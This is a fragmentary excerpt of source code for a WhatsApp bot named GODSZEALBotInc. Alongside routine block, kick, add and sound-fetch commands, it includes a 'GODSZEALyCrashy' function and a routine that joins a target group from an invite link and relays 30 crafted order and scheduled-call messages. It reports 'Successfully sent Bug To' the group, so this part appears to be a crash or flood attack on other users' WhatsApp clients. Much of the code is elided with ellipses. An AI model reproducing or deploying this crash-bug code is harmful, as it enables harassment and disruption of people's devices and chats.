...
async function GODSZEALyCrashy(dgxeon,chat) {
...
await GODSZEALBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        ...
        GODSZEALBotInc.sendPresenceUpdate(xeonrecordinfinal, from)
...
senddocu(buffer)
    ...
    case 'autostatusview':{
            ...
            case 'block':
                ...
                await GODSZEALBotInc.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GODSZEALBotInc.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
            ...
            case 'kick':
                ...
                await GODSZEALBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
...
let teks = `${text}`
{
if (DocGODSZEAL.includes(teks)) return replygcxeon("This name is already in use")
...
let teks = `${text}`
{
if (!DocGODSZEAL.includes(teks)) return replygcxeon("This name does not exist in the database")
...
case 'sound160':
case 'sound161':
GODSZEALBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
...
GODSZEALBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
...
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
...
GODSZEALBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
